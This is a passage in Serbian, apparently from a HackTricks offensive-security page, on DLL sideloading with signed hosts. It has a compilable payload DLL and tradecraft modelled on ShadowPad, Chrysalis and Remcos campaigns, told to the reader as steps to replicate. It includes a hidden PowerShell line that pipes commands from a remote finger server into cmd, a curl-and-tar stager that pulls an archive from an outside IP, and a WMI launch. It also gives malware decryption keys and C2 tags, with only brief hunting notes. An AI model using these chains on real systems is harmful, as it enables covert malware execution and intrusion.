- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristi lessmsi: lessmsi x package.msi C:\out
- Traži više malih fragmenata koji se konkateniraju i dekriptuju pomoću VBScript CustomAction. Uobičajen flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Ubacite ove dve datoteke u isti folder:
- wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: napadački DLL. Ako nisu potrebni posebni exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports pravoj biblioteci, dok payload pokrećete u DllMain.
- Napravite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za export requirements, koristi proxying framework (npr. DLLirant/Spartacus) da generišeš forwarding DLL koji takođe izvršava tvoj payload.

- Ova tehnika se oslanja na DLL name resolution od strane host binary. Ako host koristi absolute paths ili safe loading flags (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da ne uspe.
- KnownDLLs, SxS, i forwarded exports mogu uticati na precedence i moraju se uzeti u obzir tokom izbora host binary i export seta.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon deploy-uje ShadowPad koristeći **tri-file triad** da se uklopi u legitimni software dok core payload ostaje encrypted na disk-u:

1. **Signed host EXE** – zloupotrebljeni su vendor-i kao što su AMD, Realtek, ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers preimenuju executable da liči na Windows binary (na primer `conhost.exe`), ali Authenticode signature ostaje validan.
2. **Malicious loader DLL** – dropped pored EXE sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuskovan sa ScatterBrain framework; njegova jedina uloga je da locira encrypted blob, decrypt-uje ga, i reflectively map-uje ShadowPad.
3. **Encrypted payload blob** – često je smešten kao `<name>.tmp` u istom direktorijumu. Nakon memory-mapping decrypted payload-a, loader briše TMP fajl da uništi forensic evidence.

Tradecraft notes:

* Preimenovanje signed EXE (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava da se maskira kao Windows binary, a da i dalje zadrži vendor signature, pa repliciraj Ink Dragon naviku dropovanja binary-ja koji liče na `conhost.exe`, a zapravo su AMD/NVIDIA utilities.
* Pošto executable ostaje trusted, većina allowlisting kontrola treba samo da tvoj malicious DLL bude pored njega. Fokusiraj se na prilagođavanje loader DLL-a; signed parent obično može da radi neizmenjen.
* ShadowPad-ov decryptor očekuje da TMP blob bude pored loader-a i writable kako bi mogao da zero-uje fajl nakon mapping-a. Drži direktorijum writable dok se payload ne učita; kada jednom bude u memoriji, TMP fajl se može bezbedno obrisati radi OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operateri kombinuju DLL sideloading sa LOLBAS tako da je jedini custom artifact na disku malicious DLL pored trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell pokreće `cmd.exe /c`, preuzima komande sa Finger servera, i prosleđuje ih u `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preuzima TCP/79 tekst; `| cmd` izvršava odgovor servera, što operaterima omogućava da rotiraju second stage server-side.

- **Built-in download/extract:** Preuzmi archive sa benign extension-om, raspakuj ga, i stage-uj sideload target plus DLL u random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progress i prati redirects; `tar -xf` koristi Windows-ov built-in tar.

- **WMI/CIM launch:** Pokreni EXE preko WMI tako da telemetry prikazuje CIM-created process dok učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Radi sa binary-jima koji preferiraju local DLLs (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) radi pod trusted imenom.

- **Hunting:** Alarmiraj na `forfiles` kada se `/p`, `/m`, i `/c` pojave zajedno; neuobičajeno je van admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavna Lotus Blossom intrusion je zloupotrebila trusted update chain da isporuči NSIS-packed dropper koji je stage-ovao DLL sideload plus potpuno in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, drop-uje preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, i encrypted blob `BluetoothService`, zatim pokreće EXE.
- Host EXE import-uje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga decrypt-uje custom LCG-based stream-om (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), overwrite-uje buffer plaintext shellcode-om, oslobađa temp fajlove, i skače na njega.
- Da bi izbegao IAT, loader rešava API-je hashovanjem export name-ova koristeći **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, a zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi ih sa salted target hash-evima.

Main shellcode (Chrysalis)
- Decrypt-uje PE-like main module ponavljanjem add/XOR/sub sa key `gQ2JR&9;` kroz pet pass-ova, zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` da dovrši import resolution.
- Rekonstruiše DLL name string-ove u runtime-u preko per-character bit-rotate/XOR transformacija, zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaku export table u blokovima od 4 bajta sa Murmur-style mixing-om, i vraća se na `GetProcAddress` samo ako hash nije pronađen.

Embedded configuration & C2
- Config se nalazi unutar dropped `BluetoothService` fajla na **offset 0x30808** (size **0x980**) i RC4-decrypt-uje se sa key `qwhvb^435h&*7`, otkrivajući C2 URL i User-Agent.
- Beacons grade host profile razdvojen tačkama, dodaju tag `4Q`, zatim RC4-encrypt-uju sa key `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS. Responses se RC4-decrypt-uju i prosleđuju kroz tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode je gated preko CLI args: bez argumenata = install persistence (service/Run key) koji pokazuje na `-i`; `-i` ponovo pokreće sebe sa `-k`; `-k` preskače install i pokreće payload.

Alternate loader observed
- Ista intrusion je drop-ovala Tiny C Compiler i izvršavala `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. Attacker-supplied C source je embed-ovao shellcode, kompajlirao ga i pokrenuo in-memory bez dodirivanja diska sa PE-om. Replikuj sa:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova TCC-based compile-and-run faza je u runtime-u učitala `Wininet.dll` i povukla shellcode druge faze sa hardcoded URL-a, dajući fleksibilan loader koji se predstavlja kao compiler run.

## Signed-host sideloading sa export proxying + host thread parking

Neki DLL sideloading lanci dodaju **stability engineering** tako da legitimni host ostane živ dovoljno dugo da se kasnije faze učitaju uredno, umesto da se sruši nakon što se malicious DLL učita.

Uočeni obrazac
- Postavi trusted EXE pored malicious DLL koristeći očekivani dependency naziv kao što je `version.dll`.
- Malicious DLL **proxy-uje svaki očekivani export** nazad na pravi system DLL (na primer `%SystemRoot%\\System32\\version.dll`) tako da import resolution i dalje uspeva i host process nastavlja da radi.
- Nakon load-a, malicious DLL **patchuje host entry point** tako da main thread upadne u beskonačnu `Sleep` petlju umesto da izađe ili izvrši code paths koji bi završili process.
- Novi thread obavlja pravi malicious rad: dekriptovanje imena ili path-a next-stage DLL-a (RC4/XOR su česti), a zatim njegovo pokretanje pomoću `LoadLibrary`.

Zašto je ovo bitno
- Obično DLL proxying čuva API compatibility, ali ne garantuje da će host ostati živ dovoljno dugo za kasnije faze.
- Parking main thread-a u `Sleep(INFINITE)` je jednostavan način da signed process ostane rezidentan dok loader obavlja dekripciju, staging ili network bootstrap u worker thread-u.
- Lov samo na sumnjiv `DllMain` može promašiti ovaj obrazac ako se zanimljivo ponašanje dešava tek nakon što je host entry point patchovan i sekundarni thread startuje.

Minimalni workflow
1. Kopiraj signed host EXE i odredi koji DLL rešava iz lokalnog direktorijuma.
2. Napravi proxy DLL koji exportuje iste funkcije i prosleđuje ih legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreiraj worker thread.
4. Iz tog threada patchuj host entry point ili main thread start rutinu tako da petlja na `Sleep`.
5. Dekriptuj ime/config next-stage DLL-a i pozovi `LoadLibrary` ili manual-map payload.

Defensive pivoti
- Signed process-i koji učitavaju `version.dll` ili slične common libraries iz svog application direktorijuma umesto iz `System32`.
- Memory patch-evi na process entry point-u kratko nakon image load-a, posebno jump/call-ovi preusmereni na `Sleep`/`SleepEx`.
- Thread-ovi koje kreira proxy DLL i koji odmah pozivaju `LoadLibrary` na drugi DLL sa dekriptovanim imenom.
- Full-export proxy DLL-ovi postavljeni pored vendor executable-ova unutar writable staging direktorijuma kao što su `ProgramData`, `%TEMP%`, ili unpacked archive path-ovi.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
